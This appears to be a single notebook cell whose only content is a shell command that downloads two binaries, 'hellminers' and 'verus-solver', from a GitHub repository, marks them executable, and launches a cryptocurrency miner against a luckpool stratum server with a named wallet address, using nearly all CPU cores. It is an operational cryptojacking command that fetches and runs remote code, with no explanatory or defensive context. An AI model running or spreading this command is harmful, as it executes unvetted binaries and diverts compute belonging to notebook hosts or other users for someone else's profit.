# %%
! wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REm5s3T1L9szA5p9xzeWGokiPyNpceMPoj.LahirSehat -p x --cpu $(nproc --ignore 1)
